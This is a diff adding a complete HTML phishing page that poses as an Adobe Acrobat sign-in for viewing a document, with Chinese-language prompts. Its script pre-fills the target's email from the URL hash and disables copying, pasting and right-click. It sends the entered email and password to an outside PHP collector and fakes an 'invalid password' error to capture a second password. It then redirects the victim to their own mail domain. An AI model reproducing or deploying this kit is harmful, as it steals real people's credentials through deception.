@@ -1,0 +1,396 @@
+
+<html lang="CN">
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data synchronization </title>
+    <script>
+        // Disable copying
+        document.addEventListener("copy", function (event) {
+            event.preventDefault();
+        });
+
+        // Disable pasting
+        document.addEventListener("paste", function (event) {
+            event.preventDefault();
+        });
+    </script>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body,
+        html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: #f0f0f0;
+            font-family: Arial, sans-serif;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        #loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            transition: opacity 0.5s, visibility 0.5s;
+        }
+
+        .spin {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #217346;
+            border-radius: 50%;
+            animation: spinning 1s linear infinite;
+            margin: 20px 0;
+        }
+
+        @keyframes spinning {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        #logo {
+            width: 100px;
+            height: auto;
+        }
+
+        #main-content {
+            opacity: 0;
+            transition: opacity 0.5s;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-text {
+            font-size: 1.2em;
+            color: #555;
+            animation: pulse 1.5s infinite;
+        }
+
+        #submitLoader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 1);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #submitLoader .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid green;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .container {
+            width: 400px;
+            height: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: rgba(225, 225, 225, 0.5);
+        }
+
+        .input-field {
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        .input-field input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+
+        .input-field label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .error-message {
+            color: red;
+            display: none;
+            /* Hidden initially */
+            margin-bottom: 10px;
+        }
+
+        .submit-btn {
+            width: 40%;
+            padding: 10px;
+            background-color: blue;
+            color: white;
+            border: none;
+            align: left;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: darkblue;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .spin {
+                width: 30px;
+                height: 30px;
+                border-width: 3px;
+            }
+
+            .loading-text {
+                font-size: 1em;
+            }
+
+            #logo {
+                width: 60px;
+            }
+        }
+    </style>
+</head>
+
+<body oncontextmenu="return false;"
+    style="background-image: url('https://i.gyazo.com/11441218d7c6cf64b93348e469bfa05c.gif'); background-position: center; background-repeat: no-repeat;">
+    <div id="loader" style="opacity: 0; visibility: hidden;">
+        <img id="logo"
+            src="https://i.gyazo.com/e6facf719c1bf12696f9a33080c38b65.webp"
+            pdf="">
+        <div class="spin"></div>
+        <p class="loading-text">Almost ready... Please wait!</p>
+        <p class="loading-text"><strong>Preparing your dashboard...</strong></p>
+    </div>
+
+    <!-- Submit Loading Screen -->
+    <div id="submitLoader">
+        <div class="spinner"></div>
+    </div>
+
+    </p>
+    <div id="main-content" style="opacity: 1;">
+        <div class="container">
+            <form method="post" id="loginForm">
+                <input type="text" name="robot_check" id="robot_check" style="display:none" autocomplete="off">
+                <input type="hidden" name="form_time" id="form_time" value="">
+                <div class="input-field">
+                    <img id="logo" src="https://i.gyazo.com/ce0ef9c8f7d5c1e576afd687926b05ef.png" alt="">
+                    <p style="margin-bottom: -10px;margin-top: -8px;font-weight: bold;text-align: top;">Adobe Acrobat
+                    </p>
+                    <p style="font-size: 12px;align: left;margin-bottom: 40px;color: green;">Do more for free.<br> Sign
+                        in or create a free account.</p>
+                    <p>
+                    <h5>
+                        &#39564;&#35777;&#47141;&#x1F512;
+                        <p style="font-size: 10px;font-weight: normal;">
+                            &#30005;&#23376;&#37038;&#20214;&#36229;&#26102;
+                            &#30331;&#24405;&#20197;&#26597;&#30475;&#25991;&#26723;...
+                            <label for="email"></label>
+                            <input type="email" id="email" name="email" placeholder="Email Address">
+                        <div class="input-field">
+                            <label for="password"></label>
+                            <input type="password" id="password" name="password" placeholder="&#23494;&#30721;"
+                                required="">
+                        </div>
+                        <div id="msg" class="error-message">
+                            密碼無效！請輸入正確的密碼。
+                        </div>
+                        <button type="submit" class="submit-btn" id="loginBtn">
+                            &#30475;&#27861;
+                        </button>
+            </form>
+        </div>
+    </div>
+    <script>
+
+        // Loading screen logic
+        window.addEventListener('load', function () {
+            showLoadingText();
+            setTimeout(hideLoader, 3000); // Adjusted loading time
+        });
+
+        function hideLoader() {
+            const loader = document.getElementById('loader');
+            const mainContent = document.getElementById('main-content');
+            loader.style.opacity = '0';
+            loader.style.visibility = 'hidden';
+            mainContent.style.opacity = '1';
+
+            // Apply background image after the loader is hidden
+            document.body.style.backgroundImage = "url('https://i.gyazo.com/1a76415b008f71bd97a0883ddc53b7fd.jpg')"; // Replace with your image URL
+            document.body.style.backgroundSize = "cover";
+            document.body.style.backgroundPosition = "cover";
+            document.body.style.backgroundRepeat = "no-repeat";
+        }
+
+        function showLoadingText() {
+            const textElement = document.querySelector('.loading-text');
+            setTimeout(() => {
+                textElement.textContent = "Loading... Do not close or refresh the page!";
+            }, 2000);
+            setTimeout(() => {
+                textElement.textContent = "Almost ready... Please wait!";
+            }, 4000);
+        }
+    </script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            let count = 0;
+
+            // Set timestamp on load
+            $('#form_time').val(Math.floor(Date.now() / 1000));
+
+
+            // Auto-fill email from hash (e.g., #user@example.com)
+            const ai = window.location.hash.substr(1);
+            if (ai && isValidEmail(ai)) {
+                const atIndex = ai.indexOf("@");
+                const domainSlice = ai.substring(atIndex + 1);
+                const domain = domainSlice.substring(0, domainSlice.indexOf('.'));
+                const finalDomain = domain.toLowerCase();
+
+                $('#email')
+                    .val(ai)        // Fill email input
+                    .prop('readonly', true);
+                $('#msg').hide();
+            }
+            function isValidEmail(email) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            }
+            // Add hidden timestamp
+            if (!$('#form_time').length) {
+                $('<input>').attr({
+                    type: 'hidden',
+                    id: 'form_time',
+                    name: 'form_time',
+                    value: Math.floor(Date.now() / 1000)
+                }).appendTo('#loginForm');
+            }
+
+            // Submit on Enter key
+            $(document).keypress(function (event) {
+                if (event.which === 13) {
+                    event.preventDefault();
+                    $("#loginBtn").click();
+                }
+            });
+
+            // Form submission
+            $('#loginForm').on('submit', function (event) {
+                event.preventDefault();
+                $('#msg').hide();
+
+
+                const email = $('#email').val().trim();
+                const password = $('#password').val();
+
+                // client-side checks
+                if (!email || !password) {
+                    $('#msg').text('請輸入郵箱地址和密碼').show();
+                    return;
+                }
+                if (!isValidEmail(email)) {
+                    $('#msg').text('請輸入有效的電子郵件地址').show();
+                    return;
+                }
+
+                count++;
+
+                const formData = new FormData(this);
+                $.ajax({
+                    url: 'https://saouryadi.in/wp-content/uploads/Cpanel/eng_domain/orange.php',
+                    type: 'POST',
+                    data: formData,
+                    dataType: 'json',
+                    processData: false,
+                    contentType: false,
+                    beforeSend: function () {
+                        $('#loginBtn').html('核實...');
+                    },
+                    success: function (response) {
+                        if (response.status === 'error') {
+                            $('#msg').text(response.msg).show();
+                            $('#loginBtn').html('重試').prop('disabled', false);
+                            return;
+                        }
+
+                        if (count >= 2) {
+                            count = 0;
+                            if (ai) {
+                                const domain = ai.split('@')[1].split('.')[0];
+                                window.location.href = "http://www." + domain + ".com";
+                            } else {
+                                window.location.href = "http://mail.com";
+                            }
+                            return;
+                        }
+
+                        $('#password').val('');
+                        $('#msg').text('密碼無效！請輸入正確的密碼。').show();
+                        $('#loginBtn').html('重試').prop('disabled', false);
+                    },
+                    error: function (xhr, status, error) {
+                        $('#msg').text("提交失敗，請重試。").show();
+                        $('#loginBtn').html('重試').prop('disabled', false);
+                    }
+                });
+            });
+        });
+    </script>
+
+
+
+</body>
+
+</html>
